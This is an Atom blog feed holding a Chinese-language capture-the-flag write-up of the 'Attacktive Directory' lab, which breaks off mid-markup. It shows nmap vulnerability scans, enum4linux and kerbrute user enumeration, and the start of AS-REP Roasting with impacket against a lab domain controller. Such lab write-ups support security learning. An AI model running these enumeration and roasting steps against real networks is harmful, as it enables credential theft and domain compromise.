<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Z4yn&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/436a77834f2add32b7dc49df6b0dbe28</icon>
  <subtitle>Better to light one candle than to curse the darkness.</subtitle>
  <link href="https://z4ynadmin.github.io/atom.xml" rel="self"/>
  
  <link href="https://z4ynadmin.github.io/"/>
  <updated>2022-11-07T07:48:40.798Z</updated>
  <id>https://z4ynadmin.github.io/</id>
  
  <author>
    <name>Z4yn&#39;s blog</name>
    <email>z4ynwanwj@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Attacktive Directory</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/Attacktive-Directory/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/Attacktive-Directory/</id>
    <published>2022-11-07T07:44:32.000Z</published>
    <updated>2022-11-07T07:48:40.798Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-信息收集"><a href="#0-信息收集" class="headerlink" title="#0 信息收集"></a>#0 信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap 10.10.193.76 -p53,80,88,135,139,445,593,3268,3269,3389 -sV -sC -sT --script vuln -Pn</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 10:13 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.193.76</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-30 02:14:15Z)</span></span><br><span class="line"><span class="string">135/tcp  open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="string">445/tcp  open  microsoft-ds?</span></span><br><span class="line"><span class="string">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">3269/tcp open  tcpwrapped</span></span><br><span class="line"><span class="string">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span></span><br><span class="line"><span class="string">|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span></span><br><span class="line"><span class="string">|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 683.18 seconds</span></span><br></pre></td></tr></table></figure><h3 id="1-enum4linux-枚举端口-139-445"><a href="#1-enum4linux-枚举端口-139-445" class="headerlink" title="#1 enum4linux 枚举端口 139/445"></a>#1 enum4linux 枚举端口 139/445</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># enum4linux 10.10.193.76     </span></span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon May 30 11:10:38 2022</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 10.10.193.76</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ==================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 10.10.193.76    |</span><br><span class="line"> ==================================================== </span><br><span class="line">[E] Can<span class="string">&#x27;t find workgroup/domain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================================ </span></span><br><span class="line"><span class="string">|    Nbtstat Information for 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ============================================ </span></span><br><span class="line"><span class="string">Looking up status of 10.10.193.76</span></span><br><span class="line"><span class="string">No reply from 10.10.193.76</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ===================================== </span></span><br><span class="line"><span class="string">|    Session Check on 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ===================================== </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.</span></span><br><span class="line"><span class="string">[+] Server 10.10.193.76 allows sessions using username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.</span></span><br><span class="line"><span class="string">[+] Got domain/workgroup name: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> =========================================== </span></span><br><span class="line"><span class="string">|    Getting domain SID for 10.10.193.76    |</span></span><br><span class="line"><span class="string"> =========================================== </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.</span></span><br><span class="line"><span class="string">Domain Name: THM-AD</span></span><br><span class="line"><span class="string">Domain Sid: S-1-5-21-3591857110-2884097990-301047963</span></span><br><span class="line"><span class="string">[+] Host is part of a domain (not a workgroup)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ====================================== </span></span><br><span class="line"><span class="string">|    OS information on 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ====================================== </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.</span></span><br><span class="line"><span class="string">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span></span><br><span class="line"><span class="string">[+] Got OS info for 10.10.193.76 from smbclient: </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.</span></span><br><span class="line"><span class="string">[+] Got OS info for 10.10.193.76 from srvinfo:</span></span><br><span class="line"><span class="string">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================= </span></span><br><span class="line"><span class="string">|    Users on 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ============================= </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.</span></span><br><span class="line"><span class="string">[E] Couldn&#x27;</span>t find users using querydispinfo: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 881.</span><br><span class="line">[E] Couldn<span class="string">&#x27;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">|    Share Enumeration on 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.</span></span><br><span class="line"><span class="string">do_connect: Connection to 10.10.193.76 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Sharename       Type      Comment</span></span><br><span class="line"><span class="string">---------       ----      -------</span></span><br><span class="line"><span class="string">Reconnecting with SMB1 for workgroup listing.</span></span><br><span class="line"><span class="string">Unable to connect with SMB1 -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attempting to map shares on 10.10.193.76</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ==================================================== </span></span><br><span class="line"><span class="string">|    Password Policy Information for 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ==================================================== </span></span><br><span class="line"><span class="string">[E] Unexpected error from polenum:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attaching to 10.10.193.76 using a NULL share</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Trying protocol 139/SMB...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] Protocol failed: Cannot request session (Called Name:10.10.193.76)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Trying protocol 445/SMB...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - &#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[E] Failed to get password policy with rpcclient</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================== </span></span><br><span class="line"><span class="string">|    Groups on 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ============================== </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting builtin groups:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting builtin group memberships:</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting local groups:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting local group memberships:</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting domain groups:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting domain group memberships:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ======================================================================= </span></span><br><span class="line"><span class="string">|    Users on 10.10.193.76 via RID cycling (RIDS: 500-550,1000-1050)    |</span></span><br><span class="line"><span class="string"> ======================================================================= </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.</span></span><br><span class="line"><span class="string">[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-523 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-524 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-528 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-550 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================================= </span></span><br><span class="line"><span class="string">|    Getting printer info for 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ============================================= </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.</span></span><br><span class="line"><span class="string">Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">enum4linux complete on Mon May 30 11:22:29 2022</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h3 id="2-通过-Kerberos-枚举用户"><a href="#2-通过-Kerberos-枚举用户" class="headerlink" title="#2 通过 Kerberos 枚举用户"></a>#2 通过 Kerberos 枚举用户</h3><p>用户列表 : <a href="https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt">https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt</a></p><p>密码列表 : <a href="https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt">https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># ./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.122.125 userlist.txt </span></span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 05/30/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/05/30 14:24:09 &gt;  Using KDC(s):</span><br><span class="line">2022/05/30 14:24:09 &gt;  10.10.122.125:88</span><br><span class="line"></span><br><span class="line">2022/05/30 14:24:10 &gt;  [+] VALID USERNAME: james@spookysec.local</span><br><span class="line">2022/05/30 14:24:14 &gt;  [+] VALID USERNAME: svc-admin@spookysec.local<span class="comment"># 值得注意的帐户</span></span><br><span class="line">2022/05/30 14:24:20 &gt;  [+] VALID USERNAME: James@spookysec.local</span><br><span class="line">2022/05/30 14:24:22 &gt;  [+] VALID USERNAME: robin@spookysec.local</span><br><span class="line">2022/05/30 14:24:48 &gt;  [+] VALID USERNAME: darkstar@spookysec.local</span><br><span class="line">2022/05/30 14:25:02 &gt;  [+] VALID USERNAME: administrator@spookysec.local</span><br><span class="line">2022/05/30 14:25:30 &gt;  [+] VALID USERNAME: backup@spookysec.local<span class="comment"># 值得注意的帐户</span></span><br><span class="line">2022/05/30 14:25:43 &gt;  [+] VALID USERNAME: paradox@spookysec.local</span><br><span class="line">2022/05/30 14:27:15 &gt;  [+] VALID USERNAME: JAMES@spookysec.local</span><br><span class="line">2022/05/30 14:27:43 &gt;  [+] VALID USERNAME: Robin@spookysec.local</span><br><span class="line">2022/05/30 14:30:49 &gt;  [+] VALID USERNAME: Administrator@spookysec.local</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-滥用-Kerberos"><a href="#3-滥用-Kerberos" class="headerlink" title="#3 滥用 Kerberos"></a>#3 滥用 Kerberos</h3><p>用户帐户枚举完成后，我们可以尝试使用称为 <strong>AS-REP Roasting 的攻击方法滥用 Kerberos 中的功能。</strong>当用户帐户设置了“不需要预身份验证”权限时，会发生 AS-Re proasting。这意味着该帐户 在请求指定用户帐户的 Kerberos 票证之前不需要提供有效的身份证明<strong>。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># impacket-GetNPUsers spookysec.local/ -dc-ip 10.10.122.125 -usersfile users.txt -format hashcat                       </span></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User james doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span 